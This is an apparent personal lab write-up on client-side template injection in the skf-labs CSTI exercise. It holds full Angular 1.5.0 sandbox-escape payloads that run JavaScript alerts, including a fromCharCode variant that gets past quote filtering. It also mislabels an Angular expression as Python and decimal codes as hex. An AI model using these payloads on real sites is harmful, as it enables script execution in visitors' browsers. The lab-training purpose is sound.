# Definition
Something to do!!
## Installing and Preparing lab
I will be using [skf-labs](https://github.com/blabla1337/skf-labs) github project as lab.
```shell
git clone https://github.com/blabla1337/skf-labs
```
___
Then, we will use *python2.7* and *pip2*.
```shell
sudo apt install python2
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
python2.7 ./get-pip.py
```
___
Now, let's install requirements.
```shell
rm ./get-pip.py
cd skf-labs/python/CSTI
pip2 install -r requirements.txt
```
___
Finally, we are going to deploy the vulnerable web.
```Python
python2 CSTI.py
```
![[Pasted image 20230720173240.png]]
___
# Attacking
## Understanding
First, we could insert our name.
![[Pasted image 20230720174323.png]]
___
We can see that this web uses a *Client Side Template* ejecution from this code space.
![[Pasted image 20230720174504.png]]
___
# Attacking
## Verifying CSTI
We could verify if there is CSTI vulnerability by inserting a *Python* math operation.
```Python
{{7*7}}
```
![[Pasted image 20230720174734.png]]
___
Great, now we can search some *payload* to do a CSTI in the web, but first we should obtain the web technologies used.
Pressing **CTRL+u** we can see that this web uses *Angular V1.5.0*.
![[Pasted image 20230720175130.png]]
___
## Hacking
After doing a web search, we found this [Angular1.5.0-CSTI-payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md) from *Payloads All The Things*.
```Python
{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("
    astNode=pop();astNode.type='UnaryExpression';
    astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';
    astNode.argument={type:'Identifier',name:'foo'};
    ");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}
```
___
And putting it on the web.
![[Pasted image 20230720175710.png]]
___
But, if we want to put **PWNED** instead of **1** that will not work.
```Python
{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("
    astNode=pop();astNode.type='UnaryExpression';
    astNode.operator='(window.X?void0:(window.X=true,alert("PWNED")))+';
    astNode.argument={type:'Identifier',name:'foo'};
    ");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}
```
![[Pasted image 20230720175941.png]]
___
To achieve the above, we should do a *Hex to String* conversion.
```Javascript
// HEX('PWNED') = [80, 87, 78, 69, 68]
String.fromCharCode(80, 87, 78, 69, 68)
```
![[Pasted image 20230720180903.png]]
___
And then updating our payload to *Bypass* the string limitation.
```Python
{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("
    astNode=pop();astNode.type='UnaryExpression';
    astNode.operator='(window.X?void0:(window.X=true,alert(String.fromCharCode(80, 87, 78, 69, 68))))+';
    astNode.argument={type:'Identifier',name:'foo'};
    ");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}
```
![[Pasted image 20230720181126.png]]
___